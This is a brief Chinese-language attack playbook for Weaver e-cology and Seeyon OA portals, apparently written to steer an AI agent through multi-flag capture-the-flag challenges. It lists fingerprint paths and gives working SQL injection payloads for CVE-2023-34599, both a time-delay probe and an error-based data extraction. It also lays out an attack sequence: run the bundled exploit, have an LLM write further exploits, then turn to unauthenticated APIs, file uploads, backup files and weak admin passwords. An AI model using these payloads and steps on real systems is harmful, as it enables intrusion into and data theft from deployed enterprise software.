# 国产 OA / 企业门户指纹与攻击手册

## 规律
- 泛微 e-cology 特征：/weaver/ 前缀（weaver.login.jsp）、/wui/、/ecology/ 目录
  均 200；致远 OA 特征：/seeyon/、a8-v5。命中即按对应成熟漏洞打，不要盲扫。
- 泛微 FileDownloadForOutDoc 前台 SQLi（CVE-2023-34599，Ecology 9.x <10.58）：
  POST /weaver/weaver.file.FileDownloadForOutDoc，body
  `fileid=1+WAITFOR+DELAY+'0:0:4'&isFromOutImg=1` 延迟即存在；
  用 `fileid=1+AND+1=CONVERT(int,(SELECT...FOR+XML+PATH('')))` 报错回显拉数据。
  项目内置成熟脚本 tools/pocs/weaver_sqli/weaver_sqli.py。
- 综合门户题多为多 flag 多子系统：一个洞通常只给一个 flag，
  需要横向发现多个入口（OA 登录、Nacos、actuator、静态目录、上传点）。
- 门户站常见 flag 点：备份文件（backup.zip/www.zip）、upload 目录、
  news.php?id= SQLi、admin 弱口令后台。

## 打法
1. 先指纹：/weaver/ /seeyon/ /nacos/ /actuator 一轮 HEAD/GET 定组件。
2. 命中 OA 组件优先跑内置 POC（poc_weaver_sqli / poc_seeyon），再 LLM 写 exp。
3. 多 flag 题每拿一个 flag 换攻击面：登录页 → 未授权 API → 文件上传 → 备份。
4. 报错注入拿数据时优先查表名/列名里的 flag、user、secret 关键词表。
